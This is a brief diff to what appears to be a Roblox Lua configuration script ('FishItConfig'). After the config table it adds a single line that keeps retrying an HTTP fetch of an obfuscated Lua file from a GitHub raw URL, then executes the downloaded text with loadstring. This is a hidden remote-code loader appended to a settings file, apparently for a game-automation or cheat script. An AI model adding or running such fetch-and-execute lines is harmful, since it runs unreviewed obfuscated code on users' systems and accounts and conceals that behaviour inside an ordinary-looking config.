@@ -161,9 +161,4 @@ _G.FishItConfig = _G.FishItConfig or {
 
 }
 
-
-
-
-
-
-
+local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/shake-kaitun-obfuscated.lua")end)wait(1)until s;loadstring(r)()
